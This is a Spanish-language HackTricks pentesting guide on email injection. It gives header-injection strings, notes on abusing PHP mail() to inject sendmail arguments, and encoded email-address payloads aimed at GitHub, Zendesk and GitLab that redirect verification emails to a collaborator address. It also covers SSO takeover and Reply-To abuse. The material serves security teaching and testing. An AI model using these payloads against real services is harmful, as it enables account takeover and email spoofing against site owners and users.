# Inyecciones de Email

{{#include ../banners/hacktricks-training.md}}

## Inyectar en el correo electr√≥nico enviado

### Inyectar Cc y Bcc despu√©s del argumento del remitente
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
El mensaje se enviar√° a las cuentas de destinatario y destinatario1.

### Inyectar argumento
```
From:sender@domain.com%0ATo:attacker@domain.com
```
El mensaje se enviar√° al destinatario original y a la cuenta del atacante.

### Inyectar argumento de Asunto
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
El asunto falso se a√±adir√° al asunto original y en algunos casos lo reemplazar√°. Depende del comportamiento del servicio de correo.

### Cambiar el cuerpo del mensaje

Inyecta un salto de l√≠nea de dos l√≠neas, luego escribe tu mensaje para cambiar el cuerpo del mensaje.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Explotaci√≥n de la funci√≥n mail() de PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### El 5to par√°metro ($additional_parameters)

Esta secci√≥n se basar√° en **c√≥mo abusar de este par√°metro suponiendo que un atacante lo controla**.

Este par√°metro se a√±adir√° a la l√≠nea de comandos que PHP utilizar√° para invocar el binario sendmail. Sin embargo, ser√° sanitizado con la funci√≥n `escapeshellcmd($additional_parameters)`.

Un atacante puede **inyectar par√°metros adicionales para sendmail** en este caso.

#### Diferencias en la implementaci√≥n de /usr/sbin/sendmail

La interfaz de **sendmail** es **proporcionada por el software de correo MTA** (Sendmail, Postfix, Exim, etc.) instalado en el sistema. Aunque la **funcionalidad b√°sica** (como los par√°metros -t -i -f) permanece **igual** por razones de compatibilidad, **otras funciones y par√°metros** var√≠an considerablemente dependiendo del MTA instalado.

Aqu√≠ hay algunos ejemplos de diferentes p√°ginas de manual del comando/interfaz sendmail:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

Dependiendo del **origen del binario sendmail**, se han descubierto diferentes opciones para abusar de ellos y **filtrar archivos o incluso ejecutar comandos arbitrarios**. Ver c√≥mo en [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Inyecci√≥n en el nombre del correo electr√≥nico

> [!CAUTION]
> Ten en cuenta que si logras crear una cuenta en un servicio con un nombre de dominio arbitrario (como Github, Gitlab, CloudFlare Zero trust...) y verificarla recibiendo el correo electr√≥nico de verificaci√≥n en tu direcci√≥n de correo, podr√≠as acceder a ubicaciones sensibles de la empresa v√≠ctima.

### Partes ignoradas de un correo electr√≥nico

Los s√≠mbolos: **+, -** y **{}** en raras ocasiones pueden ser utilizados para etiquetar y son ignorados por la mayor√≠a de los servidores de correo electr√≥nico.

- Por ejemplo, john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Comentarios entre par√©ntesis ()** al principio o al final tambi√©n ser√°n ignorados.

- Por ejemplo, john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Bypass de lista blanca

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Citas

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Tambi√©n puedes usar IPs como nombres de dominio entre corchetes:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### Codificaci√≥n de correos electr√≥nicos

Como se explic√≥ en [**esta investigaci√≥n**](https://portswigger.net/research/splitting-the-email-atom), los nombres de correo electr√≥nico tambi√©n pueden contener caracteres codificados:

- **Desbordamiento de PHP 256**: La funci√≥n `chr` de PHP seguir√° sumando 256 a un car√°cter hasta que se vuelva positivo y luego realizar√° la operaci√≥n `%256`.
- `String.fromCodePoint(0x10000 + 0x40) // êÅÄ ‚Üí @`

> [!TIP]
> El objetivo de este truco es terminar con una inyecci√≥n como `RCPT TO:<"collab@psres.net>collab"@example.com>`\
> que enviar√° el correo electr√≥nico de verificaci√≥n a una direcci√≥n de correo electr√≥nico diferente de la esperada (por lo tanto, introducir otra direcci√≥n de correo electr√≥nico dentro del nombre del correo y romper la sintaxis al enviar el correo).

Diferentes codificaciones:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#¬†iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 ‚Üí x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- Nota el `@` codificado como =40, el `>` codificado como `=3e` y `null` como `=00`&#x20;
- Enviar√° el correo de verificaci√≥n a `collab@psres.net`
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- El mismo truco que antes pero a√±adiendo una comilla regular al principio y la comilla codificada `=22` antes del `@` codificado y luego comenzando y cerrando algunas comillas antes del siguiente correo para corregir la sintaxis utilizada internamente por Zendesk
- Enviar√° el correo de verificaci√≥n a `collab@psres.net`
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- Nota el uso del guion bajo como un espacio para separar la direcci√≥n
- Enviar√° el correo de verificaci√≥n a `collab@psres.net`
- Punycode: Usando Punycode fue posible inyectar una etiqueta `<style` en Joomla y abusar de ella para robar el token CSRF a trav√©s de la exfiltraci√≥n de CSS.

#### Tooling

- Hay un **script de Burp Suite Turbo Intruder** para fuzzear este tipo de combinaciones para intentar atacar formatos de correo electr√≥nico. El script ya tiene combinaciones potencialmente funcionales.
- Tambi√©n es posible usar [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) para crear un ataque de divisi√≥n de correo electr√≥nico

### Other vulns

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## Third party SSO

### XSS

Algunos servicios como **github** o **salesforce permiten** crear una **direcci√≥n de correo electr√≥nico con cargas √∫tiles de XSS en ella**. Si puedes **usar estos proveedores para iniciar sesi√≥n en otros servicios** y estos servicios **no est√°n sanitizando** correctamente el correo electr√≥nico, podr√≠as causar **XSS**.

### Account-Takeover

Si un **servicio SSO** te permite **crear una cuenta sin verificar la direcci√≥n de correo electr√≥nico dada** (como **salesforce**) y luego puedes usar esa cuenta para **iniciar sesi√≥n en un servicio diferente** que **conf√≠a** en salesforce, podr√≠as acceder a cualquier cuenta.\
&#xNAN;_&#x4E;ote que salesforce indica si el correo electr√≥nico dado fue o no verificado, pero la aplicaci√≥n deber√≠a tener en cuenta esta informaci√≥n._

## Reply-To

Puedes enviar un correo electr√≥nico usando _**From: company.com**_ y _**Replay-To: attacker.com**_ y si se env√≠a alguna **respuesta autom√°tica** debido a que el correo fue enviado **desde** una **direcci√≥n interna**, el **atacante** podr√≠a ser capaz de **recibir** esa **respuesta**.

## Hard Bounce Rate

Ciertos servicios, como AWS, implementan un umbral conocido como **Hard Bounce Rate**, t√≠picamente establecido en 10%. Esta es una m√©trica cr√≠tica, especialmente para servicios de entrega de correo electr√≥nico. Cuando se supera esta tasa, el servicio, como el servicio de correo electr√≥nico de AWS, puede ser suspendido o bloqueado.

Un **hard bounce** se refiere a un **correo electr√≥nico** que ha sido devuelto al remitente porque la direcci√≥n del destinatario es inv√°lida o no existe. Esto podr√≠a ocurrir por varias razones, como que el **correo** se env√≠e a una direcci√≥n no existente, un dominio que no es real, o la negativa del servidor del destinatario a aceptar **correos**.

En el contexto de AWS, si env√≠as 1000 correos y 100 de ellos resultan en hard bounces (debido a razones como direcciones o dominios inv√°lidos), esto significar√≠a una tasa de hard bounce del 10%. Alcanzar o superar esta tasa puede hacer que AWS SES (Simple Email Service) bloquee o suspenda tus capacidades de env√≠o de correos electr√≥nicos.

Es crucial mantener una baja tasa de hard bounce para asegurar un servicio de correo ininterrumpido y mantener la reputaci√≥n del remitente. Monitorear y gestionar la calidad de las direcciones de correo electr√≥nico en tus listas de correo puede ayudar significativamente a lograr esto.

Para obtener informaci√≥n m√°s detallada, se puede consultar la documentaci√≥n oficial de AWS sobre el manejo de rebotes y quejas en [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## References

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
